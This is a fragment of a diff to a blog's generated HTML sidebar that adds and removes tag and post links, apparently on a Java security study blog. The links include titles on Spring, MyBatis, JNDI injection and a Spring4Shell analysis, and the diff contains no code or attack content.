+			<li><a href="/tags/二次编码绕过/">二次编码绕过<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>129</span></a></li>
@@ -857,6 +856,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/02/22/J-Spring/" ><i class="fa fa-file-o"></i>J-Spring</a>
+      </li>
+    
+      <li>
         <a href="/2024/02/13/J-Mybatis/" ><i class="fa fa-file-o"></i>mybatis学习</a>
       </li>
     
@@ -870,10 +873,6 @@
     
       <li>
         <a href="/2024/01/19/Spring4Shell漏洞/" ><i class="fa fa-file-o"></i>Spring4Shell漏洞原理分析(CVE-2022...</a>
-      </li>
-    
-      <li>
-        <a href="/2024/01/16/JNDI注入/" ><i class="fa fa-file-o"></i>JNDI注入</a>
       </li>
     
   </ul>
